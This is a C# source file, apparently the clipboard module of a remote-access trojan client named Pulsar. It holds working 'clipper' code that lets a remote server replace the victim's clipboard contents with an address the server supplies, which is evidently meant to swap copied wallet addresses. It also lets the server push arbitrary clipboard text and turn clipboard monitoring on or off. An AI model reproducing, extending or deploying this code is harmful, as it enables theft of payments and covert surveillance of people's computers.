using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Clipboard;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Threading;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Diagnostics;


namespace Pulsar.Client.Messages
{
    public class ClipboardHandler : IMessageProcessor
    {
        // Do not use this for changing addresses, the clipper address might have changed (or the clipper may be off altogether).
        public static List<string> _cachedAddresses = new List<string>(); 
        
        public static string _lastReceivedClipboardText = string.Empty;
        public static DateTime _lastReceivedTime = DateTime.MinValue;

        public bool CanExecute(IMessage message) => message is DoSendAddress || message is SendClipboardData || message is SetClipboardMonitoringEnabled;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoSendAddress msg:
                    Execute(sender, msg);
                    break;
                case SendClipboardData msg:
                    Execute(sender, msg);
                    break;
                case SetClipboardMonitoringEnabled msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoSendAddress message)
        {
            Thread clipboardThread = new Thread(() =>
            {
                Thread.CurrentThread.SetApartmentState(ApartmentState.STA);
                string clipperAddress = message.Address;
                _cachedAddresses.Add(clipperAddress);
                try
                {
                    Clipboard.SetText(clipperAddress);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex.Message);
                }
                Application.DoEvents();
            })
            { IsBackground = true };
            clipboardThread.SetApartmentState(ApartmentState.STA);
            clipboardThread.Start();
            clipboardThread.Join();
        }
        
        private void Execute(ISender client, SendClipboardData message)
        {
            if (_lastReceivedClipboardText == message.ClipboardText || string.IsNullOrEmpty(message.ClipboardText))
            {
                return;
            }
            
            Debug.WriteLine($"ClipboardHandler: Setting clipboard to: {message.ClipboardText.Substring(0, Math.Min(20, message.ClipboardText.Length))}...");  

            Thread clipboardThread = new Thread(() =>
            {
                Thread.CurrentThread.SetApartmentState(ApartmentState.STA);
                
                try
                {
                    _lastReceivedClipboardText = message.ClipboardText;
                    _lastReceivedTime = DateTime.Now;
                    
                    IDataObject oldData = null;
                    try
                    {
                        oldData = Clipboard.GetDataObject();
                    }
                    catch (Exception) { }
                    
                    Clipboard.SetText(message.ClipboardText);
                    
                    Application.DoEvents();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"ClipboardHandler: Error setting clipboard: {ex.Message}");
                }
            })
            { IsBackground = true };
            clipboardThread.SetApartmentState(ApartmentState.STA);
            clipboardThread.Start();
            clipboardThread.Join(1000);
        }
        
        private void Execute(ISender client, SetClipboardMonitoringEnabled message)
        {
            var application = PulsarApplication.Instance;
            if (application?.ClipboardChecker != null)
            {
                application.ClipboardChecker.IsEnabled = message.Enabled;
                Debug.WriteLine($"ClipboardHandler: Clipboard monitoring {(message.Enabled ? "enabled" : "disabled")} by server");
            }
        }
    }
}
